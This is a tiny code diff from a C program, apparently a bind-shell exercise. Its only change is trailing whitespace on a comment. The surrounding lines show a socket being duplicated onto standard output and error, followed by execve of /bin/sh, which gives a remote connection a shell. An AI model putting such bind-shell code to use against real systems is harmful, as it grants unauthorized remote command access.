@@ -35,7 +35,7 @@ int main()
 	dup2(acceptfd, 1);
 	dup2(acceptfd, 2);
 
-	// 6) Execve() Syscall
+	// 6) Execve() Syscall 
 	execve("/bin/sh", NULL, NULL);
 
 	return 0;
